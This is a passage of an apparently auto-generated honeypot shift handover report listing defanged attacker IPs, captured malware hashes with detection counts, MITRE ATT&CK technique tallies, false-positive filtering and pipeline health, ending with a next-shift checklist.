| `84.247.162[.]228` | **25** | 2026-04-20 21:02 | 2026-04-20 21:42 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `158.180.79[.]132` | **15** | 2026-04-20 21:42 | 2026-04-20 22:43 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `115.191.18[.]114` | **11** | 2026-04-20 22:17 | 2026-04-20 22:38 | 16m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.46[.]177` | **9** | 2026-04-20 22:01 | 2026-04-20 22:33 | 10m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `1.94.220[.]55` | **2** | 2026-04-20 21:14 | 2026-04-20 21:46 | 4m | 0 | `T1592` | 🟢 LOW |
| `112.47.128[.]74` | **2** | 2026-04-20 21:58 | 2026-04-20 22:00 | 2m | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]118` | 1 | 2026-04-20 20:57 | 2026-04-20 20:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]121` | 1 | 2026-04-20 20:57 | 2026-04-20 20:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.13.48[.]156` | 1 | 2026-04-20 21:39 | 2026-04-20 21:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.68[.]234` | 1 | 2026-04-20 22:02 | 2026-04-20 22:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.227.75[.]197` | 1 | 2026-04-20 21:44 | 2026-04-20 21:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.178[.]142` | 1 | 2026-04-20 22:04 | 2026-04-20 22:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `152.32.131[.]112` | 1 | 2026-04-20 21:11 | 2026-04-20 21:11 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `152.32.253[.]205` | 1 | 2026-04-20 21:10 | 2026-04-20 21:10 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `163.53.168[.]23` | 1 | 2026-04-20 21:12 | 2026-04-20 21:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.100.217[.]164` | 1 | 2026-04-20 22:02 | 2026-04-20 22:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.61.148[.]217` | 1 | 2026-04-20 22:03 | 2026-04-20 22:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.105.113[.]173` | 1 | 2026-04-20 22:34 | 2026-04-20 22:35 | 13s | 0 | `T1592` | 🟢 LOW |
| `221.162.202[.]105` | 1 | 2026-04-20 22:28 | 2026-04-20 22:28 | 13s | 0 | `T1592` | 🟢 LOW |
| `94.156.14[.]80` | 1 | 2026-04-20 21:24 | 2026-04-20 21:24 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `115.191.18[.]114` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 4 |
| `181.65.191[.]218` | PE | Universidad Nacional de Ingenieria | **100** ⚠️ | 2 |
| `104.152.52[.]121` | US | Rethem Hosting LLC | **100** ⚠️ | 50 |
| `1.94.220[.]55` | CN | Beijing Teletron Telecom Engineering Co., Ltd. | **100** ⚠️ | 27 |
| `84.247.162[.]228` | FR | Contabo GmbH | **100** ⚠️ | 0 |
| `152.32.131[.]112` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 34 |
| `165.154.6[.]104` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 33 |
| `183.105.113[.]173` | KR | Korea Telecom | **100** ⚠️ | 42 |
| `196.189.237[.]92` | ET | Ethio Telecom | **100** ⚠️ | 50 |
| `104.152.52[.]118` | US | Rethem Hosting LLC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 291 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 147 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 116 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 61 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 60 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 299 cases |
| Tool 34  | Credential Extractor        | ✅ 263 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 29 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (1.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 116 priority case(s) shown individually · 24 recon entry/entries in table (10 group(s) consolidating 164 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-20T22:51:00Z_
